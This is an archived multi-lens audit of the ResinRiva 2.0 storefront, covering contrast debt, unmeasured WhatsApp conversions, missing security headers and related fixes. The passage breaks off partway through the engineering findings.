> **ARCHIVED (historical — pre-v2.0 codebase).** This 2026-07 audit generation (master register + Appendices C/D) is superseded by `audit/FINDINGS.md` + `audit/BASELINE.md`; file paths herein no longer exist.
> Still live at archive time: SEC-009 (rotation of the previously-exposed Resend key and Google service-account JSON — provider-side owner action, not verifiable in-repo).

# ResinRiva 2.0 — Website Audit
_Audited: 2026-07-12 · Commit: 2173abe · Auditor: multi-lens panel (8 expert lenses, adversarially verified)_

> Method: 8 specialist reviewers audited the repo in parallel (read-only); every Blocker/Critical was adversarially re-checked against the code; findings were de-duplicated and scored. 76 findings survive verification. Evidence is cited as `path:line`. Runtime-only claims (Core Web Vitals) are marked **Unverified** — no Lighthouse was run.

## 1. Executive Summary
ResinRiva 2.0 is a well-architected WhatsApp-funnel storefront with a solid authorization model and clean metadata foundation, but it carries three cross-cutting debts that hold it back: a light-to-dark "Midnight Sapphire" theme pivot that was never carried through the token/contrast layer, a conversion funnel that is essentially unmeasured and un-remarketable, and serverless-unsafe/security-baseline gaps (no headers/CSP, no login brute-force protection, SVG stored-XSS, previously-exposed keys needing rotation). After adversarial review the one Critical (PERF-001) was downgraded to Major — the flagship product-card example was wrong and f_auto already delivers AVIF/WebP — so there are now zero Blockers/Criticals, but the single-resolution image issue is still real for hero/category/about and all /uploads media. The decision gate is firmly triggered on volume and effort (~26.5 de-duplicated dev-days across ~50 actionable findings), so a phased plan is warranted. Headline recommendation: ship Phase 0 security hardening and key rotation immediately, then invest in the measurement + CRO layer (analytics on WhatsApp CTAs, a pixel, email capture, seeded social proof) which is the highest-ROI work on the site. Overall health is fair-to-good (70/100): nothing is on fire, but the site is currently launching blind and with theme-inverted contrast debt.

**Phased implementation plan: TRIGGERED.** See [`audit-2026-07-implementation-plan.md`](./audit-2026-07-implementation-plan.md). Gate reasons: Post-verdict there are 0 Blockers/Criticals (PERF-001 downgraded to Major), but the other two gate conditions are met decisively. Far more than 12 actionable findings: ~50 unique findings remain after de-duplication across 8 lenses. Combined de-duplicated effort is ~26.5 dev-days (S=0.25, M=0.5, L=1.5), well above the ~3 dev-day threshold — 28 Major/Medium items plus 3 Large refactors (catalog imagery, product-form monolith, first-load JS baseline). Security items require immediate action regardless of severity labels: key rotation (SEC-009), no security headers (SEC-001), no login brute-force protection (SEC-002), and SVG stored-XSS (SEC-003). (≈26.5 dev-days total).

## 2. Scorecard

| Lens | Score /100 | Blocker | Critical | Major | Minor | Top issue |
|------|-----------:|:-------:|:--------:|:-----:|:-----:|-----------|
| UI/UX | 74 | 0 | 0 | 6 | 5 | Forced-dark canvas flattens section band rhythm and leaves light-tuned tokens with failing contrast (selected… |
| Marketing/CRO | 64 | 0 | 0 | 4 | 7 | The WhatsApp funnel is well-built but unmeasured and un-remarketable: primary CTA clicks fire no analytics,… |
| Engineering | 77 | 0 | 0 | 2 | 6 | Studio Site Settings panel is disconnected from the live header/footer — announcement, phone and WhatsApp… |
| SEO/AEO | 78 | 0 | 0 | 2 | 6 | Strong metadata/JSON-LD base, but /search is indexable + sitemapped (thin ?q= bloat) and category listing… |
| Performance | 63 | 0 | 0 | 4 | 4 | Hero/category/about and all /uploads images ship single-resolution originals (unoptimized disables srcset,… |
| Accessibility | 66 | 0 | 0 | 5 | 4 | Form error text sits at ~2.7:1 on the dark canvas and errors are not programmatically tied to inputs — the… |
| Security | 68 | 0 | 0 | 5 | 5 | Solid per-action authz, but zero security headers/CSP, no brute-force protection on the single-admin login,… |
| Design System | 63 | 0 | 0 | 3 | 7 | Theme-inverted debt from the dark pivot: hardcoded gold #8a6d1a now fails AA, tone token names describe light… |
| **Overall** | **70** | 0 | 0 | 31 | 39 | Dark-only theme + missing states/headers; strong engineering base |

## 3. Quick Wins (high impact / low effort — do these first)
- **SEC-009** — Rotate the previously-exposed Resend key and Google service-account JSON — repo is clean but the secrets are not.
- **MKT-001** — Add a whatsapp_click analytics event to every WhatsApp CTA — instruments the core conversion for near-zero effort.
- **SEC-003** — Drop image/svg+xml from accepted upload types (or serve as attachment) to close the stored-XSS vector.
- **SEC-008** — Swap the scraper CSV export's any-authenticated check for the requireStaff role guard.
- **SEO-001** — Add noindex to /search and remove it from the sitemap to stop infinite thin ?q= index bloat.
- **SEO-002** — Emit a canonical tag on /shop/[category] to collapse filter-param duplicates.
- **A11Y-001** — Fix the destructive error-text token so funnel form errors clear AA (~4.5:1) on the dark canvas.
- **A11Y-005** — Add a skip-to-content link and an id on the main landmark in both public and studio layouts.
- **ENG-003** — Route the contact notification email through studioFrom() instead of the hardcoded Resend sandbox sender so it delivers in prod.
- **DS-001** — Replace hardcoded #8a6d1a with an AA-passing gold-ink token (fixes DS-004 duplication in the same pass).
- **MKT-005** — Point the footer Instagram icon at the real profile (also clears the dead-link UIUX/DS duplicates).
- **SEC-007** — Rate-limit requestPasswordReset to stop reset-email bombing and token churn.
- **MKT-009** — Give the announcement bar an actual offer/urgency + link instead of static informational copy.

## 4. Systemic Issues (root causes worth fixing once)
**1. Incomplete light→dark "Midnight Sapphire" pivot (theme-inverted token debt).** The visual system was flipped to a dark canvas but the token, contrast, and dead-code layers were never migrated. One disciplined dark-canvas token pass resolves DS-001/DS-002/DS-003/DS-004/DS-006, UIUX-001/UIUX-002/UIUX-011, and A11Y-001/A11Y-002/A11Y-008/A11Y-009 (gold contrast, error-text contrast, focus rings, near-identical section bands, dead headerTheme/header-ink machinery, and semantically-drifted tone names).

**2. No measurement layer on the funnel.** There is no analytics wrapper and no pixel, so the WhatsApp-only business has no conversion, attribution, or retargeting signal. A single "add event tracking + GA4/Meta pixel + a typed track() helper" workstream fixes MKT-001, MKT-002, and MKT-007 together.

**3. Serverless-unsafe in-memory assumptions.** Rate limiting and spam buckets are per-instance and reset on cold start, which is why the same weakness appears as SEC-005, ENG-008, and effectively defeats SEC-002's intended login protection. Moving to a shared/durable store (e.g. Upstash/Redis) fixes all three.

**4. Studio Site Settings not wired to the live chrome.** The header, footer, and announcement bar read hardcoded constants instead of the settings the admin panel edits — one integration (ENG-001) restores control over MKT-005 (social link), MKT-009 (announcement offer), and the phone/WhatsApp number surfaced sitewide.

**5. Heavy client runtime mounted unconditionally in the root layout.** GSAP/ScrollTrigger/SplitText + Lenis + the preloader + motion load on every route including static legal and studio admin pages, producing PERF-002/PERF-004/PERF-007/PERF-008/PERF-009 from one architectural decision. Scoping these providers to the routes that need them addresses the cluster.

**6. No security/sanitization baseline.** Absent response headers and unsanitized rich-text rendering are the same missing-defensive-layer root: SEC-001 (headers/CSP), SEC-003 (SVG), and SEC-006 (Tiptap javascript: hrefs) should land as one hardening pass.

**7. Placeholder social presence + empty structured data.** A dead '#' link and empty sameAs recur as MKT-005, UIUX-010, DS-010, SEO-007, and ENG-007 — populating real profile URLs once clears all of them and strengthens the LocalBusiness schema for the funnel.

**Adversarial verification adjustments:** `PERF-001` ADJUSTED → Major.

**De-duplicated / overlapping (fix together):**
- `PERF-001` — ADJUSTED per verdict Critical->Major: hero/category/about/homepage-feature and all /uploads images do ship single-resolution, but the cited product-card example is conditional on /uploads only (Cloudinary cards ARE optimized) and f_auto already delivers AVIF/WebP, so the 'single biggest CWV risk / 3-6x' framing was overstated.
- `A11Y-003` ⊇ `UIUX-007` — Same defect reported by two lenses: mobile menu dialog has no focus trap and leaves the background focusable.
- `UIUX-005` ⊇ `A11Y-006` — Instagram/Behold widget has no loading/empty/error/fallback state — silent blank on external-module failure (UIUX + A11Y views of one issue). PERF-005 (defer the script) kept separate as a distinct perf angle.
- `DS-001` ⊇ `DS-004` — Hardcoded gold #8a6d1a failing AA on dark and the missing gold-ink token (duplicated across 5 files) are the same fix: introduce one AA-passing token.
- `DS-002` ⊇ `UIUX-011` — Section headerTheme prop is required but ignored, making the DynamicHeader dark-ink/section-aware system unreachable dead code — reported by DS and UIUX.
- `MKT-005` ⊇ `UIUX-010`, `DS-010` — Footer Instagram link is a dead '#' placeholder — flagged independently by MKT, UIUX, and DS; single fix (real profile URL).
- `SEO-007` ⊇ `ENG-007` — Thin Organization/LocalBusiness JSON-LD with empty sameAs and minimal address — same schema gap seen by SEO and ENG.
- `SEC-005` ⊇ `ENG-008` — In-memory, per-instance rate limiter ineffective across serverless fan-out — identical issue from SEC and ENG lenses.
- `MKT-010` ⊇ `SEO-005` — Above-the-fold h1 is a brand-poetic slogan that is neither offer-clear (CRO) nor keyword-bearing (SEO); one headline rewrite addresses both.

## 5. Findings by Lens

### UI/UX (UIUX)

#### [UIUX-001] Forced-dark canvas flattens section band rhythm — "porcelain" and "ice" tones are near-identical
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/layout/section.tsx:6-13; src/app/globals.css:60-72; src/app/(public)/layout.tsx:45`
- **Observation:** The public layout hard-wraps everything in `.dark` (layout.tsx:45). Under `.dark`, `--background:#0a0a0a` and `--card:#101319` (globals.css:60,62). TONE_CLASSES maps `porcelain:"bg-background"` and `ice:"bg-card"` (section.tsx:7-8), so the home page's alternating porcelain→ice→porcelain bands (page.tsx sections 3/4/7/10) render as #0a0a0a vs #101319 — roughly a 1.1:1 luminance difference, visually indistinguishable.
- **Impact:** The intended editorial rhythm of alternating light/dark bands is gone; long scrolls read as one flat black sheet, weakening visual hierarchy and the perceived luxury of the layout. Only the midnight/deep-ocean/void bands provide any separation.
- **Recommendation:** Give alternating bands a real delta: either lift `--card` to ~#161a24 and add a hairline top border on `ice` sections, or introduce a distinct `tone="raised"` with `bg-card` + `shadow-luxe-sm`/inset border so adjacent bands separate. Audit page.tsx section order once the delta exists.
- **Status:** Verified

#### [UIUX-002] Light-mode-tuned tokens fail contrast on the dark canvas (selected swatch label, gold badge)
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/product/order-panel.tsx:551; src/components/ui/badge.tsx:14`
- **Observation:** The selected SWATCH chip uses `text-sapphire-deep` (#0c3f92) on `bg-sapphire/10` over the #0a0a0a canvas — roughly 1.8:1, far below WCAG AA (4.5:1 for 14px text). The `gold` Badge variant is `bg-gold/10 text-[#8a6d1a]` (badge.tsx:14); that brown-gold ink on the near-black card is ~3.5–4:1, failing AA for the small `text-xs` label (e.g. the "Made in India" badge, page.tsx:566). These colors were clearly picked for the light `:root` palette that is now never used.
- **Impact:** On the primary conversion surface, a customer cannot read which color swatch they've selected; brand badges are muddy. Both are core-flow and accessibility regressions caused by the dark-only decision.
- **Recommendation:** Add dark-canvas overrides: selected swatch → `text-porcelain` (or `text-azure`) with `bg-sapphire/25`; gold badge → `text-gold` (#d4af37) at higher weight. Since the site is dark-only, retune the `.dark` values of `--accent-foreground`/gold usages rather than keeping the light-mode hexes.
- **Status:** Verified

#### [UIUX-003] Hero H1 (the LCP element) is hidden by GSAP until document.fonts.ready — contradicts the "LCP never waits on JS" intent
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/motion/kinetic-heading.tsx:68,158; src/components/sections/home-hero.tsx:59-66`
- **Observation:** HomeHero's H1 renders through `<KineticHeading scrollTrigger={false}>`. Its effect calls `gsap.set(el,{autoAlpha:0})` synchronously (kinetic-heading.tsx:68), then only reveals after `document.fonts.ready.then(build)` (line 158) and the SplitText animation runs. So for every JS-enabled visitor, the largest above-the-fold text is set to opacity/visibility:0 from hydration until the webfont resolves — directly contradicting the component comment claiming static LCP.
- **Impact:** On first visit / slow networks the hero headline is blank for a beat then animates in, degrading Largest Contentful Paint and the first impression on the most important screen. (No-JS users are fine — the effect never runs — but that is the minority path.)
- **Recommendation:** Reveal-gate on a short timeout race with `document.fonts.ready` (e.g. `Promise.race([fonts.ready, timeout(400ms)])`), or render the hero H1 as plain static text and only apply the split reveal to below-the-fold H2s. At minimum, don't set autoAlpha:0 for `scrollTrigger:false` mount headings until fonts resolve within a capped budget.
- **Status:** Verified

#### [UIUX-004] Floating WhatsApp FAB overlaps the sticky "Customize" CTA on mobile product pages
- **Severity:** Major
- **Effort:** S
- **Location:** `src/components/layout/floating-whatsapp.tsx:56-58; src/components/product/sticky-mobile-cta.tsx:30-33`
- **Observation:** On product pages the sticky bar is `fixed inset-x-0 bottom-0 z-30` with the "Customize" button pinned to its right edge (sticky-mobile-cta.tsx:34-42). The FAB is `fixed bottom-5 right-5 z-40` size-14 (floating-whatsapp.tsx:43,57). The FAB therefore sits directly over the bottom-right corner where the Customize button lives; the code comment even acknowledges it renders above at z-40.
- **Impact:** Two primary CTAs collide on the exact template where conversion matters most — the WhatsApp bubble occludes/steals taps meant for "Customize," and the stacked circles look unpolished on small screens.
- **Recommendation:** On product routes, either hide the global FAB (the sticky bar already funnels to the order panel) or lift the sticky bar's right padding and raise the FAB above it (`bottom-24` when a sticky CTA is present). Detect via a layout flag or route check.
- **Status:** Verified

#### [UIUX-005] Instagram feed embed has no loading, empty, or error state — silent blank on failure
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/sections/instagram-feed.tsx:15-25; src/app/(public)/page.tsx:754-762`
- **Observation:** InstagramFeed injects a third-party module script from w.behold.so and renders a bare `<behold-widget>` custom element with no skeleton, no fallback, and no error boundary. If the script is blocked (privacy extensions, ad blockers, network), the homepage's final content section shows only the "follow along on instagram" eyebrow above empty space.
- **Impact:** A whole homepage section can render blank with zero graceful degradation, and there's a layout-shift gap while the async widget hydrates. On a luxury brand page this reads as broken.
- **Recommendation:** Wrap the widget in a fixed-min-height container with a shimmer placeholder, and provide a static fallback grid or a "View us on Instagram" button that shows if the widget hasn't hydrated within ~3s (e.g. a timeout flag). Reserve space to prevent CLS.
- **Status:** Verified

#### [UIUX-006] Quick View is hover/focus-only — undiscoverable on touch and an invisible tap target
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/shop/product-card.tsx:143-147; src/components/shop/quick-view.tsx:59-69`
- **Observation:** The QuickView trigger sits in a slot styled `opacity-0 ... focus-within:opacity-100 group-hover:opacity-100` (product-card.tsx:144). Touch devices never fire hover, so the eye button is permanently invisible to the ~mobile-majority audience. Worse, `opacity:0` does not disable pointer events, so the invisible button still occupies the card's top-right corner and will intercept a tap there — opening a dialog the user can't see they triggered instead of navigating.
- **Impact:** A conversion feature is effectively desktop-only, and mobile users get a confusing corner-tap that opens Quick View unexpectedly rather than following the card link.
- **Recommendation:** On touch (`useIsTouch`), either render Quick View as an always-visible pill button or drop the trigger entirely and rely on the card link; and gate pointer interception with `pointer-events-none` while opacity-0 so hidden triggers never capture taps.
- **Status:** Verified

#### [UIUX-007] Mobile menu dialog has no focus trap — Tab escapes to the page behind
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/components/layout/dynamic-header.tsx:369-456,264`
- **Observation:** The mobile overlay is `role="dialog" aria-modal="true"` and correctly locks body scroll, focuses the close button on open, restores focus on close, and closes on Escape (dynamic-header.tsx:253-275). But there is no focus containment: pressing Tab from the last menu link moves focus into the still-rendered header/page underneath the overlay.
- **Impact:** Keyboard and screen-reader users can tab out of an ostensibly modal menu onto hidden background controls, an ARIA-modal contract violation and a WCAG 2.4.3 focus-order issue.
- **Recommendation:** Add a Tab/Shift+Tab wrap handler that cycles focus between the first and last focusable elements inside `#mobile-menu`, or port the menu to Radix Dialog (already a dependency) which traps focus for free.
- **Status:** Verified

#### [UIUX-008] Catalog categories fall back to abstract gradient placeholders instead of imagery
- **Severity:** Minor
- **Effort:** L
- **Location:** `src/app/(public)/page.tsx:349-366; src/components/shop/product-card.tsx:95-100`
- **Observation:** When a category has no `image`, the collections rail renders one of six blue gradients (page.tsx:358-366, `BLUE_GRADIENTS`), and product cards without an image show `gradient-dopamine` (product-card.tsx:96-99). Per recon, five catalog categories are still on these placeholders, so the primary browse surfaces show interchangeable abstract blue tiles.
- **Impact:** For a visual-first luxury resin brand, gradient placeholders make collections indistinguishable and undersell the product; the homepage "The collections" rail is the main discovery path.
- **Recommendation:** Prioritize real category cover art (this is a content task) and, until then, differentiate placeholders with the category initial/monogram and name overlay so tiles aren't visually identical; keep gradients keyed to category slug rather than array index so they're stable across renders.
- **Status:** Verified

#### [UIUX-009] Long-text fields cap silently — maxLength with no character counter
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/sections/custom-order-form.tsx:207; src/components/product/order-panel.tsx:353; src/components/sections/contact-form.tsx:186-192`
- **Observation:** The custom-order design-idea textarea enforces `maxLength={2000}` (custom-order-form.tsx:207) and notes fields `maxLength={1500}`, but none show a live counter. The contact form message has a zod `.max(2000)` but no `maxLength` attr and no counter either, so users only learn the limit after submit via an inline error.
- **Impact:** Users composing a detailed commission brief can hit the cap mid-sentence with no warning, or (contact form) write a long message and get rejected on submit — friction on the exact inputs that feed the WhatsApp inquiry funnel.
- **Recommendation:** Add a right-aligned `{value.length}/{max}` counter under each capped textarea that turns `text-destructive` near the limit, and add the matching `maxLength` attr to the contact message field so client and server limits agree.
- **Status:** Verified

#### [UIUX-010] Dead social link and empty structured-data social profiles
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/layout/footer.tsx:34; src/app/(public)/layout.tsx:22`
- **Observation:** The footer Instagram icon is `href="#"` (footer.tsx:34, with a TODO), so clicking it jumps to the top of the current page rather than opening Instagram. Correspondingly the Organization JSON-LD `sameAs` is an empty array (layout.tsx:22).
- **Impact:** A prominent social affordance visibly does nothing, which erodes trust on a brand that leans on Instagram; search engines also get no social-profile signal.
- **Recommendation:** Wire the real Instagram URL into `SITE`/constants and use it in both the footer anchor and JSON-LD `sameAs`; if no handle exists yet, remove the icon rather than shipping a `#` link.
- **Status:** Verified

#### [UIUX-011] Section-aware header-ink machinery is now dead code with no visual payoff
- **Severity:** Polish
- **Effort:** M
- **Location:** `src/components/layout/section.tsx:41-46; src/components/layout/dynamic-header.tsx:139-224`
- **Observation:** DynamicHeader runs an IntersectionObserver + MutationObserver + rAF hysteresis system to swap header ink per section (dynamic-header.tsx:139-224). But every Section now hard-codes `data-header-theme="dark"` and explicitly discards its prop via `void headerTheme` (section.tsx:41,44), so the observer always resolves to a single ink. The `headerTheme` prop threaded through every page is inert.
- **Impact:** Significant client-side complexity and observer/mutation overhead runs on every route for an effect that can never change, and the misleading `headerTheme` API invites incorrect assumptions from future contributors.
- **Recommendation:** Since the site is committed to a single dark canvas, replace the observer with a constant ink (light) and delete the hysteresis/mutation code, or restore genuinely light bands (see UIUX-001) so the machinery earns its keep. Either way, drop or document the now-inert `headerTheme` prop.
- **Status:** Verified

### Marketing/CRO (MKT)

#### [MKT-001] Primary WhatsApp CTA clicks fire NO analytics event — the core conversion is unmeasured
- **Severity:** Major
- **Effort:** S
- **Location:** `src/components/layout/floating-whatsapp.tsx:38; src/components/sections/home-hero.tsx:93; src/app/(public)/page.tsx:788; src/components/layout/footer.tsx:126; src/components/layout/dynamic-header.tsx:345`
- **Observation:** Vercel `track()` is wired into the two structured forms (order-panel.tsx:243/246, custom-order-form.tsx:160) and share buttons, but every direct WhatsApp deep-link CTA — the floating button, hero 'Order bespoke on WhatsApp', header/mobile 'Start on WhatsApp', footer 'Chat on WhatsApp', and both home + product 'Start on WhatsApp' CTA bands — is a plain `<a href={waHref}>` with no onClick tracking. These are the highest-volume conversion actions in a WhatsApp-only model.
- **Impact:** You cannot measure how many people actually initiate a WhatsApp chat, which surface drives them, or the click-through rate of any CTA band. The primary macro-conversion of the whole business model is invisible in analytics, making it impossible to optimize placement, copy, or A/B test CTAs.
- **Recommendation:** Add a shared `onClick={() => track('whatsapp_cta_click', { source: 'hero'|'floating'|'header'|'footer'|'cta_band', ... })}` to every wa.me anchor. Wrap the pattern in a small `WhatsAppLink` component (or a `trackWa(source)` helper) so all surfaces emit a consistent event with a `source` property. Keep it fire-and-forget inside try/catch like quick-view.tsx:39.
- **Status:** Verified

#### [MKT-002] No Meta Pixel / GA4 — zero retargeting audiences and no conversion attribution
- **Severity:** Major
- **Effort:** M
- **Location:** `src/app/layout.tsx:43-44 (only Analytics + SpeedInsights mounted)`
- **Observation:** grep across src for googletagmanager/gtag/fbevents/fbq/meta pixel/next-script returns nothing. Only @vercel/analytics and speed-insights are installed. There is no Meta Pixel, GA4, or GTM anywhere.
- **Impact:** A luxury commission brand that will inevitably run Instagram/Meta ads cannot build retargeting/lookalike audiences, cannot report WhatsApp-click conversions back to the ad platform for optimization, and has no cross-tool funnel/attribution. This caps paid-acquisition efficiency and wastes ad spend the moment marketing starts.
- **Recommendation:** Add Meta Pixel (and optionally GA4) via `next/script` with `strategy='afterInteractive'` in layout.tsx, gated behind a `NEXT_PUBLIC_META_PIXEL_ID` env var. Fire a standard `Contact`/`Lead` pixel event alongside the `track('whatsapp_cta_click')` from MKT-001 and on `whatsapp_redirected` so ad platforms can optimize toward chat initiations.
- **Status:** Verified

#### [MKT-003] No email / lead capture anywhere — 'launching soon' and undecided visitors leak with no re-engagement path
- **Severity:** Major
- **Effort:** M
- **Location:** `src/app/(public)/page.tsx:488-525 (launching-soon block); site-wide (no newsletter component exists)`
- **Observation:** grep for newsletter/subscribe/mailing-list finds nothing but unrelated React `subscribe()` hooks. The empty-collection state ('Collection launching soon', page.tsx:497) and the whole model offer only WhatsApp as the next step. There is no email field, waitlist, or 'notify me' anywhere on the site.
- **Impact:** For a made-to-order luxury brand with a genuinely empty/growing catalog, high-intent visitors who aren't ready to open WhatsApp (browsing on desktop, comparing, waiting for a launch) have zero low-friction way to stay in the funnel. Every one of them is lost with no owned channel to remarket to for launches or seasonal gifting.
- **Recommendation:** Add a lightweight email capture (a `NewsletterForm` server action writing to a `Subscriber` table or an ESP webhook) in the footer and in the launching-soon / out-of-stock states, framed as 'Get first access to new drops.' Respects the WhatsApp-only checkout model — this is a top-of-funnel owned channel, not a cart.
- **Status:** Verified

#### [MKT-004] Fresh deploy shows ZERO social proof — testimonials unseeded and the whole section auto-hides when empty
- **Severity:** Major
- **Effort:** M
- **Location:** `src/app/(public)/page.tsx:673 (testimonials section rendered only when count>0); prisma/seed.ts (no testimonial records)`
- **Observation:** grep for 'testimonial' across prisma/*.ts returns nothing — no testimonials are seeded. The homepage guards the section with `testimonialItems.length > 0`, and portfolio (page.tsx:593) is similarly conditional. The only always-on 'proof' is the STATS block (page.tsx:63-77): '100% handcrafted', '500+ hours of craft', '1 of 1' — vanity/attribute claims, not third-party trust signals (no client count, pieces delivered, years in business, or ratings).
- **Impact:** A first-time visitor to a high-ticket, pay-later-on-WhatsApp brand sees no reviews, no star ratings, no delivered-work count, and a dead Instagram link (MKT-005) — the exact trust signals needed before someone hands over a custom commission. This is one of the largest conversion drags on the page.
- **Recommendation:** Seed 3-6 real testimonials so the section renders on launch; surface an aggregate trust line ('X commissions delivered · rated 5.0') near the hero or in the Why-ResinRiva band; and replace one vanity stat with a concrete social metric once available.
- **Status:** Verified

#### [MKT-005] Footer Instagram icon links to a dead '#' placeholder on every page
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/layout/footer.tsx:32-50`
- **Observation:** The footer social row has an explicit `// TODO: replace "#" with the real Instagram handle` and `<a href="#" aria-label="ResinRiva on Instagram">`. The homepage separately embeds a live Behold Instagram feed (page.tsx:759, feedId hardcoded), so the handle clearly exists — the footer link just points nowhere.
- **Impact:** The one persistent social-proof/follow link in the footer does nothing (jumps to top of page), losing Instagram follows and undermining credibility on a page that is supposed to build trust. It appears site-wide.
- **Recommendation:** Point the anchor at the real Instagram profile URL (add an `instagramUrl` to SITE constants), add target=_blank rel=noopener, and fire a `track('social_click',{channel:'instagram'})`.
- **Status:** Verified

#### [MKT-006] Testimonials are text-only with no photo/UGC, no aggregate rating, and no review schema
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/components/sections/testimonial-carousel.tsx:108-127`
- **Observation:** Each testimonial renders a star icon row, quote, name, location — no customer photo, no piece photo, no 'verified' marker, and no aggregate rating is shown or emitted as JSON-LD (product page emits Product/AggregateOffer schema but never AggregateRating/Review).
- **Impact:** Text-only quotes are the weakest form of social proof for a visual luxury product, and the absence of Review/AggregateRating structured data forfeits rich-result star snippets in Google that materially lift CTR from search.
- **Recommendation:** Add an optional customer/piece image and a 'verified commission' badge to the testimonial model + card; emit `Review` + `AggregateRating` JSON-LD (reuse the JsonLd component) on the homepage and product pages where testimonials map to a product.
- **Status:** Verified

#### [MKT-007] `place_order_clicked` mis-fires post-submit and form-start/drop-off is untracked
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/product/order-panel.tsx:243-246`
- **Observation:** `track('place_order_clicked')` is called only AFTER `submitProductOrder` resolves (line 243) and is skipped entirely when the action throws (the catch block at 255 has no track). There is no event when the user starts/interacts with the form. Same shape in custom-order-form.tsx:160.
- **Impact:** The event named like a click actually measures successful inquiry creation, so failed/abandoned submissions are invisible and the name is misleading. With no 'order_form_started' event you cannot compute form-completion rate or locate where the highest-intent users drop off — the deepest part of the funnel is a black box.
- **Recommendation:** Emit `order_form_started` on first field interaction, keep a true `order_submit_attempt` before the async call, and move the success event into the `result.ok` branch as `order_submitted`. Rename for clarity.
- **Status:** Verified

#### [MKT-008] Product-page CTA has no benefit/trust bullets adjacent — jumps straight from price into a long form
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/(public)/product/[slug]/page.tsx:301-317`
- **Observation:** The right column goes title → price/timeline chip → the full ProductOrderPanel with no reassurance in between. Benefit content ('About this piece', care notes) lives in a separate band far below (page.tsx:331+). The only trust microcopy is buried at the bottom of the form (order-panel.tsx:471, 'No payment here…').
- **Impact:** At the decision point, the visitor sees a demanding form (name/phone/uploads) before any reason-to-believe. For a pay-on-WhatsApp commission this raises friction and abandonment; benefits-over-features reassurance next to the CTA is a well-known conversion lever that's missing here.
- **Recommendation:** Insert a compact 3-item trust/benefit list above `#order-panel` (e.g. 'Poured & finished by hand', 'Ships safely across India', 'Price & timeline confirmed on WhatsApp — no payment now'). Static server markup, no new dependencies.
- **Status:** Verified

#### [MKT-009] Announcement bar is static informational copy — no offer, urgency, or link
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/layout/announcement-bar.tsx:4-5,28-45`
- **Observation:** The default message ('Made-to-order luxury resin art — every order finalized personally on WhatsApp') restates the model and, by default, has no `href`, so the most persistent above-the-fold strip on every page is non-clickable and carries no conversion lever.
- **Impact:** The top bar is prime real estate that currently converts nothing. A luxury brand can use it for a shipping reassurance, seasonal gifting hook, or 'commissions open — X week lead time' with a link to /shop or WhatsApp.
- **Recommendation:** Make the default message an offer/urgency line linking to /shop or the WhatsApp CTA, and track clicks. Keep it editable from SiteSettings so marketing can rotate it.
- **Status:** Verified

#### [MKT-011] Product OG/share cards often ship with no description
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/(public)/product/[slug]/page.tsx:86-104`
- **Observation:** `description = product.seoDescription || product.shortTagline || undefined` and `openGraph.images = ogImages` only when `product.ogImage` is set. A product with no SEO description, no tagline, and no ogImage yields a share card with only a title and the generic root OG image — no descriptive text and no product photo.
- **Impact:** WhatsApp/Instagram/Meta shares of individual pieces (a core organic-growth loop for a visual brand, and the exact channel the ShareButtons component promotes) render weak, text-thin cards that suppress click-through on shared links.
- **Recommendation:** Fall back OG description to a trimmed product.description, and default `openGraph.images` to the first gallery image (absoluteUrl) when ogImage is unset so every product has a rich share card. Consider a per-product dynamic opengraph-image route as products.opengraph-image already exists for the pattern.
- **Status:** Verified

#### [MKT-010] Above-the-fold headline is brand-poetic, not offer-clear; relies entirely on the eyebrow
- **Severity:** Polish
- **Effort:** S
- **Location:** `src/components/sections/home-hero.tsx:59-75`
- **Observation:** The H1 'Liquid luxury, cast forever.' communicates mood but not what is sold or how to buy; the concrete value ('custom resin art · 3d printing · made to order') sits only in the smaller eyebrow above it, and the WhatsApp model appears only in the trust chips (line 114).
- **Impact:** A first-time visitor arriving from an ad or search must read the sub-copy to understand the offer. Style-forward headlines can underperform benefit-clear ones on cold traffic; worth validating rather than assuming.
- **Recommendation:** Keep the poetic H1 but A/B test a benefit-forward variant (e.g. 'Bespoke resin art & 3D-printed keepsakes, made to order') and ensure the WhatsApp-ordering promise appears in the sub-headline, not just the trust chips. Gate via a simple flag once MKT-001/002 tracking exists to measure it.
- **Status:** Verified

### Engineering (ENG)

#### [ENG-001] Site Settings admin panel is disconnected from the global site chrome — announcement, phone, WhatsApp and socials never surface site-wide
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/layout/dynamic-header.tsx:310, src/components/layout/footer.tsx:97-115, src/actions/settings.ts:127-129`
- **Observation:** The studio Site Settings form persists brandName, announcement, phone, whatsappNumber, socials, logoUrl (src/actions/settings.ts:32-53). But the global header renders `<AnnouncementBar />` with NO props (dynamic-header.tsx:310), so it always shows the hardcoded DEFAULT_MESSAGE (announcement-bar.tsx:4). The footer reads only the static SITE constant for phone/email/maps/WhatsApp (footer.tsx:97-115, buildWaLink() uses SITE.whatsappNumber). No public page except contact/product reads siteSettings — grep confirms only contact/page.tsx:39,43 and product/page.tsx consume it. Yet settings.ts:127-129 comments 'Brand, announcement, contact and default SEO surface on every public page' and calls revalidatePath('/', 'layout'), so the author believes it works.
- **Impact:** A core admin feature is effectively write-only. The owner can edit the announcement/phone/WhatsApp number in Studio, see a success toast, and nothing changes on the live header/footer that every visitor sees. Changing the WhatsApp number — the single most business-critical value on a WhatsApp-only store — requires a code deploy, not a settings edit.
- **Recommendation:** Load SiteSettings once in src/app/(public)/layout.tsx (cached findUnique id:'main') and thread announcement/whatsappNumber/phone/socials into DynamicHeader, AnnouncementBar and Footer, falling back to SITE constants. Make buildWaLink accept an override number sourced from settings. Remove the misleading comment or make it true.
- **Status:** Verified

#### [ENG-002] No centralized environment-variable validation module — misconfiguration fails late and silently disables features
- **Severity:** Major
- **Effort:** S
- **Location:** `src/lib/db.ts:13, src/lib/constants.ts:4-5, src/lib/email.ts:24, src/lib/scraper/sheets.ts:40-57`
